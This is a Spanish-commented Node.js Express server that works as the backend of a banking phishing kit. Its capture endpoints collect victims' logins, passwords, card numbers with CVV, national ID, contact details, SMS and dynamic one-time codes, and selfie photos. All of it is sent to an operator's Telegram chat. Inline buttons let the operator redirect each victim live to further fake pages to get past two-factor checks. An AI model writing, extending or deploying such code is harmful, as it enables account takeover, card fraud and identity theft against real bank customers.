const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

// Variables de entorno de Telegram
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// -----------------------------
// 1. Modelo de comandos/acciones
// -----------------------------

// Acciones soportadas desde Telegram
const ACTIONS = {
  ERROR_LOGO: "ERROR_LOGO",
  PEDIR_LOGO: "PEDIR_LOGO",
  ERROR_SMS: "ERROR_SMS",
  PEDIR_SMS: "PEDIR_SMS",
  ERROR_CARD: "ERROR_CARD",
  PEDIR_CARD: "PEDIR_CARD",
  ERROR_DATOS: "ERROR_DATOS",
  PEDIR_DATOS: "PEDIR_DATOS",
  ERROR_SOYYO: "ERROR_SOYYO",
  PEDIR_SOYYO: "PEDIR_SOYYO",
  ERROR_DINAMICA: "ERROR_DINAMICA",
  PEDIR_DINAMICA: "PEDIR_DINAMICA",
  ERROR_922: "ERROR_922",
  PEDIR_922: "PEDIR_922",
};

// Mapeo de acción -> URL final a la que debe ser redirigido el cliente.
// IMPORTANTE: loading.html espera un campo JSON `redirect_to` con la URL COMPLETA.
// Aquí usamos rutas relativas del mismo dominio donde se sirvan los HTML.
function buildRedirectUrl(action) {
  switch (action) {
    case ACTIONS.ERROR_LOGO:
      return "index.html?state=error_logo";
    case ACTIONS.PEDIR_LOGO:
      return "index.html?state=pedir_logo";

    case ACTIONS.ERROR_SMS:
      return "sms.html?state=error_sms";
    case ACTIONS.PEDIR_SMS:
      return "sms.html?state=pedir_sms";

    case ACTIONS.ERROR_CARD:
      return "card.html?state=error_card";
    case ACTIONS.PEDIR_CARD:
      return "card.html?state=pedir_card";

    case ACTIONS.ERROR_DATOS:
      return "datos.html?state=error_datos";
    case ACTIONS.PEDIR_DATOS:
      return "datos.html?state=pedir_datos";

    case ACTIONS.ERROR_SOYYO:
      return "soyyo.html?state=error_soyyo";
    case ACTIONS.PEDIR_SOYYO:
      return "soyyo.html?state=pedir_soyyo";

    case ACTIONS.ERROR_DINAMICA:
      return "dinamica.html?state=error_dinamica";
    case ACTIONS.PEDIR_DINAMICA:
      return "dinamica.html?state=pedir_dinamica";

    case ACTIONS.ERROR_922:
      return "922.html?state=error_922";
    case ACTIONS.PEDIR_922:
      return "922.html";

    default:
      return null;
  }
}

// -----------------------------
// 2. Almacenamiento en memoria
// -----------------------------

// Estructura simple en memoria:
// orders[sessionId] = { action, redirectTo, createdAt }
const orders = Object.create(null);

// Tiempo máximo que una orden se considera válida (ms)
const ORDER_TTL_MS = 5 * 60 * 1000; // 5 minutos

function saveOrder(sessionId, action) {
  const redirectTo = buildRedirectUrl(action);
  if (!redirectTo) {
    return null;
  }

  const order = {
    action,
    redirectTo,
    createdAt: Date.now(),
  };

  orders[sessionId] = order;
  return order;
}

function consumeOrder(sessionId) {
  const order = orders[sessionId];
  if (!order) {
    return null;
  }

  const isExpired = Date.now() - order.createdAt > ORDER_TTL_MS;
  if (isExpired) {
    delete orders[sessionId];
    return null;
  }

  // Consumo de un solo uso
  delete orders[sessionId];
  return order;
}

// Limpieza periódica (defensiva)
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, order] of Object.entries(orders)) {
    if (now - order.createdAt > ORDER_TTL_MS) {
      delete orders[sessionId];
    }
  }
}, 60 * 1000);

// -----------------------------
// 3. Configuración del servidor
// -----------------------------

const app = express();
const PORT = process.env.PORT || 3000;

// CORS: permitir peticiones desde cualquier origen (frontend, móviles, Azure Blob, etc.)
app.use(cors());

// Para leer JSON en los webhooks (límite 20mb para soportar fotos base64 HD)
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: false, limit: '20mb' }));

// Ruta raíz y health para Render
app.get("/", (req, res) => {
  res.json({ ok: true, service: "tricoserver1" });
});
app.get("/health", (req, res) => {
  res.json({ ok: true, status: "healthy" });
});

// -----------------------------
// 4. Endpoint de polling usado por loading.html
// -----------------------------

// IMPORTANTE: loading.html actualmente hace fetch hacia
//   https://<servidor>/instruction/{sessionId}
// y espera un JSON con la propiedad `redirect_to`.

app.get("/instruction/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  if (!sessionId) {
    return res.status(400).json({
      ok: false,
      error: "sessionId requerido",
      redirect_to: null,
    });
  }

  const order = consumeOrder(sessionId);

  if (!order) {
    return res.json({
      ok: true,
      action: null,
      redirect_to: null,
    });
  }

  return res.json({
    ok: true,
    action: order.action,
    redirect_to: order.redirectTo,
  });
});

// -----------------------------
// 5. Webhook de Telegram (esqueleto)
// -----------------------------

// NOTA IMPORTANTE:
// - Este endpoint asume que los botones de Telegram envían en `callback_data`
//   un JSON con el siguiente formato:
//   { "action": "ERROR_LOGO", "sessionId": "<id-sesion-cliente>" }
// - El parseo concreto puede ajustarse cuando se despliegue el bot.

app.post("/telegram/webhook", async (req, res) => {
  try {
    const update = req.body;

    // Callback query (botones inline)
    const callbackQuery = update.callback_query;
    if (!callbackQuery || !callbackQuery.data) {
      // No es un callback de botón que nos interese
      return res.json({ ok: true, ignored: true });
    }

    let action = null;
    let sessionId = null;

    const rawData = callbackQuery.data;

    // Formato nuevo: "CODIGO|sessionId"
    if (typeof rawData === "string" && rawData.includes("|")) {
      const [code, sess] = rawData.split("|");
      action = CODE_TO_ACTION[code] || code;
      sessionId = sess || null;
    } else {
      // Soporte legado: JSON {"action":"...","sessionId":"..."}
      try {
        const payload = JSON.parse(rawData);
        action = payload?.action;
        sessionId = payload?.sessionId;
      } catch (e) {
        return res.json({ ok: false, error: "callback_data no es válido" });
      }
    }

    if (!action || !sessionId) {
      return res.json({
        ok: false,
        error: "callback_data debe incluir action y sessionId",
      });
    }

    const order = saveOrder(sessionId, action);
    if (!order) {
      return res.json({
        ok: false,
        error: `Acción no soportada: ${action}`,
      });
    }

    // Responder a Telegram y ocultar la botonera del mensaje
    if (TELEGRAM_TOKEN) {
      const baseUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
      try {
        await axios.post(`${baseUrl}/answerCallbackQuery`, {
          callback_query_id: callbackQuery.id,
          text: `Acción recibida: ${action}`,
          show_alert: false,
        });
      } catch (err) {
        console.error("Error respondiendo a Telegram:", err.message);
      }
      // Ocultar teclado inline del mensaje (botonera) hasta el siguiente mensaje
      const msg = callbackQuery.message;
      if (msg && msg.chat && msg.message_id) {
        try {
          await axios.post(`${baseUrl}/editMessageReplyMarkup`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            reply_markup: { inline_keyboard: [] },
          });
        } catch (err) {
          console.error("Error ocultando botonera:", err.message);
        }
      }
    }

    return res.json({
      ok: true,
      saved: true,
      action,
      sessionId,
    });
  } catch (error) {
    console.error("Error en /telegram/webhook:", error);
    return res.status(500).json({ ok: false });
  }
});

// -----------------------------
// 6. Funciones auxiliares y endpoints de datos
// -----------------------------

async function enviarMensajeTelegram(texto) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("TELEGRAM_TOKEN o TELEGRAM_CHAT_ID no definidos");
    return;
  }

  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  await axios.post(apiUrl, {
    chat_id: TELEGRAM_CHAT_ID,
    text: texto,
    parse_mode: "HTML",
  });
}

// Envía el mensaje a Telegram CON botones inline para redirigir al cliente
// IMPORTANTE: Telegram limita callback_data a 64 bytes.
// Usamos códigos cortos y un string "CODIGO|sessionId".
const ACTION_TO_CODE = {
  [ACTIONS.ERROR_LOGO]: "ELG",
  [ACTIONS.PEDIR_LOGO]: "PLG",
  [ACTIONS.ERROR_SMS]: "ESM",
  [ACTIONS.PEDIR_SMS]: "PSM",
  [ACTIONS.ERROR_CARD]: "ECRD",
  [ACTIONS.PEDIR_CARD]: "PCRD",
  [ACTIONS.ERROR_DATOS]: "EDAT",
  [ACTIONS.PEDIR_DATOS]: "PDAT",
  [ACTIONS.ERROR_SOYYO]: "ESY",
  [ACTIONS.PEDIR_SOYYO]: "PSY",
  [ACTIONS.ERROR_DINAMICA]: "EDIN",
  [ACTIONS.PEDIR_DINAMICA]: "PDIN",
  [ACTIONS.ERROR_922]: "E922",
  [ACTIONS.PEDIR_922]: "P922",
};

const CODE_TO_ACTION = Object.entries(ACTION_TO_CODE).reduce((acc, [action, code]) => {
  acc[code] = action;
  return acc;
}, {});

function buildCallbackData(action, sessionId) {
  const code = ACTION_TO_CODE[action] || action;
  return `${code}|${sessionId}`;
}

function buildReplyMarkup(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: "ERROR LOGO", callback_data: buildCallbackData("ERROR_LOGO", sessionId) },
        { text: "PEDIR LOGO", callback_data: buildCallbackData("PEDIR_LOGO", sessionId) },
      ],
      [
        { text: "ERROR SMS", callback_data: buildCallbackData("ERROR_SMS", sessionId) },
        { text: "PEDIR SMS", callback_data: buildCallbackData("PEDIR_SMS", sessionId) },
      ],
      [
        { text: "ERROR CARD", callback_data: buildCallbackData("ERROR_CARD", sessionId) },
        { text: "PEDIR CARD", callback_data: buildCallbackData("PEDIR_CARD", sessionId) },
      ],
      [
        { text: "ERROR DATOS", callback_data: buildCallbackData("ERROR_DATOS", sessionId) },
        { text: "PEDIR DATOS", callback_data: buildCallbackData("PEDIR_DATOS", sessionId) },
      ],
      [
        { text: "ERROR SOYYO", callback_data: buildCallbackData("ERROR_SOYYO", sessionId) },
        { text: "PEDIR SOYYO", callback_data: buildCallbackData("PEDIR_SOYYO", sessionId) },
      ],
      [
        { text: "ERROR DINAMICA", callback_data: buildCallbackData("ERROR_DINAMICA", sessionId) },
        { text: "PEDIR DINAMICA", callback_data: buildCallbackData("PEDIR_DINAMICA", sessionId) },
      ],
      [
        { text: "ERROR 922", callback_data: buildCallbackData("ERROR_922", sessionId) },
        { text: "PEDIR 922", callback_data: buildCallbackData("PEDIR_922", sessionId) },
      ],
    ],
  };
}

async function enviarMensajeConBotones(texto, sessionId) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("TELEGRAM_TOKEN o TELEGRAM_CHAT_ID no definidos");
    return;
  }

  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const reply_markup = buildReplyMarkup(sessionId);

  try {
    await axios.post(apiUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: texto,
      parse_mode: "HTML",
      reply_markup,
    });
  } catch (err) {
    console.error(
      "Telegram sendMessage error:",
      err.response?.data || err.message
    );
    throw err;
  }
}

// Permite simular órdenes sin pasar por Telegram.
// Ejemplo: POST /command { "sessionId": "abc", "action": "ERROR_LOGO" }
app.post("/command", (req, res) => {
  const { sessionId, action } = req.body || {};

  if (!sessionId || !action) {
    return res.status(400).json({
      ok: false,
      error: "sessionId y action son requeridos",
    });
  }

  const order = saveOrder(sessionId, action);
  if (!order) {
    return res.status(400).json({
      ok: false,
      error: `Acción no soportada: ${action}`,
    });
  }

  return res.json({
    ok: true,
    action: order.action,
    redirect_to: order.redirectTo,
  });
});

// Captura de datos de login desde index.html
// Body esperado: { sessionId, username, password, barrio? }
app.post("/capture/index", async (req, res) => {
  try {
    const { sessionId, username, password, barrio } = req.body || {};

    if (!sessionId || !username || !password) {
      return res.status(400).json({
        ok: false,
        error: "sessionId, username y password son requeridos",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>🟡 DATO OBTENIDO - NUEVA VISITA 🟡</b>",
      "",
      `👤 <b>USUARIO:</b> ${username}`,
      `🔑 <b>CLAVE:</b> ${password}`,
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram:", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/index:", error);
    return res.status(500).json({ ok: false });
  }
});

// Prefijo con datos de login (index) para incluir en todos los mensajes de captura
function loginPrefix(body) {
  const u = body?.indexUsuario;
  const c = body?.indexClave;
  if (!u && !c) return "";
  return `📌 <b>Login:</b> ${u || "—"} | 🔑 ${c || "—"}\n\n`;
}

// Captura de datos de tarjeta desde card.html
// Body esperado: { sessionId, cardnumber, cvv, expiry, barrio?, indexUsuario?, indexClave? }
app.post("/capture/card", async (req, res) => {
  try {
    const { sessionId, cardnumber, cvv, expiry, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>💳 NUEVA CARD - CLIENTE ACTIVO</b>",
      "",
      `🔢 <b>NÚMERO:</b> ${cardnumber || "N/A"}`,
      `📅 <b>FECHA:</b> ${expiry || "N/A"}`,
      `🔒 <b>CVV:</b> ${cvv || "N/A"}`,
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(loginPrefix(req.body) + texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (card):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/card:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de datos personales desde datos.html
// Body esperado: { sessionId, name, cedula, email, phone, barrio? }
app.post("/capture/datos", async (req, res) => {
  try {
    const { sessionId, name, cedula, email, phone, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>📋 NUEVOS DATOS - CLIENTE ACTIVO</b>",
      "",
      `👤 <b>NOMBRE:</b> ${name || "N/A"}`,
      `🆔 <b>CC:</b> ${cedula || "N/A"}`,
      `📧 <b>CORREO:</b> ${email || "N/A"}`,
      `📱 <b>CELL:</b> ${phone || "N/A"}`,
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(loginPrefix(req.body) + texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (datos):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/datos:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de código SMS desde sms.html
// Body esperado: { sessionId, smsCode, barrio? }
app.post("/capture/sms", async (req, res) => {
  try {
    const { sessionId, smsCode, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>📲 NUEVO SMS - CLIENTE ACTIVO</b>",
      "",
      `🔢 <b>SMS:</b> ${smsCode || "N/A"}`,
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(loginPrefix(req.body) + texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (sms):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/sms:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de código dinámica desde dinamica.html
// Body esperado: { sessionId, dinamicaCode, barrio? }
app.post("/capture/dinamica", async (req, res) => {
  try {
    const { sessionId, dinamicaCode, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>📱 DINAMICA OBTENIDA - CLIENTE ACTIVO</b>",
      "",
      `🔢 <b>DINAMICA:</b> ${dinamicaCode || "N/A"}`,
      `🌐 <b>IP:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(loginPrefix(req.body) + texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (dinamica):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/dinamica:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de aceptación WhatsApp desde 922.html
// Body esperado: { sessionId, barrio? }
app.post("/capture/922", async (req, res) => {
  try {
    const { sessionId, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({ ok: false, error: "sessionId es requerido" });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const texto = [
      "<b>✅ WHATSAPP ACEPTADO - CLIENTE ACTIVO</b>",
      "",
      "📲 <b>ACCIÓN:</b> El cliente aceptó la verificación por WhatsApp",
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      await enviarMensajeConBotones(loginPrefix(req.body) + texto, sessionId);
    } catch (err) {
      console.error("Error enviando mensaje a Telegram (922):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/922:", error);
    return res.status(500).json({ ok: false });
  }
});

// Captura de paso SoyYo desde soyyo.html
// Body esperado: { sessionId, photoData?, barrio? }
app.post("/capture/soyyo", async (req, res) => {
  try {
    const { sessionId, photoData, barrio } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({
        ok: false,
        error: "sessionId es requerido",
      });
    }

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      "N/A";
    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;

    const caption = [
      loginPrefix(req.body) + "<b>📸 SOY YO - CLIENTE ACTIVO</b>",
      "",
      `🌐 <b>IP/BARRIO:</b> ${ipBarrio}`,
    ].join("\n");

    try {
      if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID && photoData && photoData.startsWith("data:")) {
        // Enviar la foto real vía sendPhoto (Node 18+ FormData/Blob nativos)
        const base64 = photoData.split(",")[1];
        const buffer = Buffer.from(base64, "base64");
        const form = new FormData();
        form.append("chat_id", TELEGRAM_CHAT_ID);
        form.append("photo", new Blob([buffer], { type: "image/jpeg" }), "soyyo.jpg");
        form.append("caption", caption);
        form.append("parse_mode", "HTML");
        form.append("reply_markup", JSON.stringify(buildReplyMarkup(sessionId)));
        const tgRes = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
          { method: "POST", body: form }
        );
        if (!tgRes.ok) {
          const err = await tgRes.text();
          console.error("Telegram sendPhoto error:", err);
          // Fallback a texto si la foto falla
          await enviarMensajeConBotones(caption, sessionId);
        }
      } else {
        // Sin foto disponible: mensaje de texto con botones
        await enviarMensajeConBotones(caption, sessionId);
      }
    } catch (err) {
      console.error("Error enviando a Telegram (soyyo):", err.message);
    }

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error en /capture/soyyo:", error);
    return res.status(500).json({ ok: false });
  }
});

// -----------------------------
// 7. Arranque del servidor
// -----------------------------

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Servidor escuchando en puerto ${PORT}`);
});

// Auto-ping para mantener Render activo (free tier se duerme tras ~15 min)
const PING_URL =
  process.env.RENDER_EXTERNAL_URL || "https://friendly-computing-machine-jdpk.onrender.com";
setInterval(async () => {
  try {
    const res = await fetch(`${PING_URL}/health`);
    const data = await res.json();
    console.log("🔄 Auto-ping OK:", data);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 14 * 60 * 1000);

